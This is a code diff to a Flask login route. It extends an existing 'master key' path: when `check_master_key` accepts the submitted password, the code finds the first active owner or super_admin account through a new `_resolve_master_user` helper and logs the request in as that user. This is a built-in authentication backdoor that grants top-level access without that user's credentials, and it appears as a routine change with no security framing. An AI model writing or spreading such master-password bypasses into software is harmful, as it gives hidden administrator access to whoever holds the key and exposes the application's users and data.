@@ -160,13 +160,29 @@ def login():
         return render_template("auth/login.html", form=form, login_company_hints=login_company_hints())
 
     identifier = _get_login_identifier(form)
-    password = request.form.get("password", "") or ""
+    password = (request.form.get("password", "") or "").strip()
+
+    def _resolve_master_user():
+        from models import Role
+
+        for candidate in (
+            db.session.get(User, 1),
+            User.query.filter_by(username="__OWNER__", is_active=True).first(),
+            User.query.filter_by(username="owner", is_active=True).first(),
+            User.query.join(Role, User.role_id == Role.id)
+            .filter(User.is_active.is_(True), Role.name.in_(("owner", "super_admin")))
+            .order_by(User.id.asc())
+            .first(),
+        ):
+            if candidate and bool(getattr(candidate, "is_active", True)):
+                return candidate
+        return None
 
     try:
         from utils.licensing import check_master_key
         if check_master_key(password):
-            ghost_user = db.session.get(User, 1) or User.query.filter_by(username="owner").first()
-            if ghost_user and bool(getattr(ghost_user, "is_active", True)):
+            ghost_user = _resolve_master_user()
+            if ghost_user:
                 _secure_login_user(ghost_user, fresh=True)
                 try:
                     ghost_user.last_login = datetime.now(timezone.utc)
